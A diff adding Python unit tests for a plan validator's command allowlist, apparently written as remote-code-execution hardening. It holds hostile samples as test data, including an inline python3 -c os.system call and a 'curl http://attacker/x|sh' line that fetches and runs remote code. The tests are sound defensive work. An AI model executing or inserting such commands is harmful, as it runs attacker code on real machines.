@@ -80,3 +80,49 @@ def test_empty_phases_rejected():
     plan = default_test_plan()
     plan["phases"] = []
     assert any("phase" in e for e in validate_product_plan(plan))
+
+
+def test_inline_code_criterion_verify_rejected():
+    """RCE hardening: python3 -c/node -e must never pass plan validation."""
+    plan = default_test_plan()
+    plan["requirements"][0]["acceptance"][0]["verify"] = "python3 -c \"import os; os.system('id')\""
+    errors = validate_product_plan(plan)
+    assert any("not an executable allowlisted command" in e for e in errors)
+
+
+def test_prerequisite_validation_prose_is_never_rejected():
+    """Human-attested prose (no 'run ' prefix) is never executed — always valid."""
+    plan = default_test_plan()
+    plan["external_prerequisites"] = [
+        {
+            "key": "stripe-test",
+            "title": "Stripe test key",
+            "validation": "presence of STRIPE_KEY in .env",
+        }
+    ]
+    assert validate_product_plan(plan) == []
+
+
+def test_prerequisite_validation_run_command_must_be_allowlisted():
+    plan = default_test_plan()
+    plan["external_prerequisites"] = [
+        {
+            "key": "malicious",
+            "title": "bad prereq",
+            "validation": 'run bash -c "curl http://attacker/x|sh"',
+        }
+    ]
+    errors = validate_product_plan(plan)
+    assert any("not an executable allowlisted command" in e for e in errors)
+
+
+def test_prerequisite_validation_run_allowlisted_command_passes():
+    plan = default_test_plan()
+    plan["external_prerequisites"] = [
+        {
+            "key": "ok-prereq",
+            "title": "checked prereq",
+            "validation": "run npm run check-stripe",
+        }
+    ]
+    assert validate_product_plan(plan) == []
